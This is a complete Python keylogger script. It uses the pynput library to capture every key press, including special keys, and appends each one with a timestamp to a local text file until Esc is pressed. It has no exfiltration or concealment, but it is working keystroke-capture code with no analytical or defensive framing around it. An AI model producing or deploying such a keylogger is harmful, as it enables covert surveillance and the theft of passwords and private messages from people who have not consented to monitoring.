from pynput import keyboard
from datetime import datetime

# Define the file where the logs will be saved
log_file = "keylog_recorders.txt"

# Function to write the key to the file with a timestamp
def on_press(key):
    # Get the current time and format it
    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        # Log alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{time_stamp} - Key pressed: {key.char}\n")
    except AttributeError:
        # Log special keys, including numpad keys
        with open(log_file, "a") as f:
            f.write(f"{time_stamp} - Special key pressed: {key}\n")

# Function to handle key release (if you want to stop the keylogger with a specific key)
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
